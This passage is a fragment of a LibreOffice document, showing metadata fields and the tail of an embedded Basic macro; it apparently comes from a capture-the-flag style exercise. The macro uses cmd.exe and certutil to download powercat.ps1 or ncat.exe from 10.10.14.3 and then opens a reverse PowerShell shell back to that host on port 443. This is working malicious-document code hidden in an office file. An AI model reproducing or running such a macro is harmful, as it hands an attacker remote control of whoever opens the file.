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nn3r </meta:initial-creator>
    <meta:creation-date>2017-02-06T15:15:47.35</meta:creation-date>
    <dc:date>2019-09-23T21:53:04.289494542</dc:date>
    <meta:editing-duration>PT16H35M21S</meta:editing-duration>
    <meta:editing-cycles>29</meta:editing-cycles>
    <meta:generator>LibreOffice/6.3.0.4$Linux_X86_64 LibreOffice_project/30$Build-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Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/powercat.ps1"" c:\wamp64\www\powercat.ps1 &amp; c:\wamp64\www\powercat.ps1 -c 10.10.14.3 -p 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" c:\wamp64\www\ncat.exe &amp; c:\wamp64\www\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 2 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Windows\Temp\ncat.exe &amp; C:\Windows\Temp\ncat.exe 10.10.14.3 443 -e powershell.exe")
      Shell("cmd.exe /C ping -n 3 10.10.14.3")
      Shell("cmd.exe /C certutil.exe -urlcache -split -f ""http://10.10.14.3/ncat.exe"" C:\Users\Public\ncat.exe &amp; C:\Users\Public\ncat.exe 10.10.14.3 443 -e powershell.exe")
    End Sub


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